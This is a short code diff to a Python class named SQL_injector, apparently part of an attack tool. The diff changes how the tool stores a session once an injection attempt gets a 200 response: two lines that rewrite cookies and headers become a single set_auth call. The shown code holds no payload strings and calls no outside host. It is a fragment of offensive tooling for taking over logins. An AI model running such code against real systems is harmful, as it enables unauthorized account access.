@@ -25,8 +25,7 @@ class SQL_injector(a.attack_inter):
                 print(response.status_code)
                 if response.status_code == 200:
                     print("Valid script: ", json_data['email'])
-                    newCookie, newHeader = a.modify_cookie_header(response)
-                    a.auth_write('admin',newCookie,newHeader)
+                    a.set_auth(username,response)
                     break
         else:
             json_data = self.generator(userInput)
@@ -35,6 +34,5 @@ class SQL_injector(a.attack_inter):
             if response.status_code == 200:
                 print(response.text)
                 print("Valid script: ", json_data['email'])
-                newCookie, newHeader = a.modify_cookie_header(response)
-                a.auth_write(username,newCookie,newHeader)
+                a.set_auth(username,response)
             return response.status_code
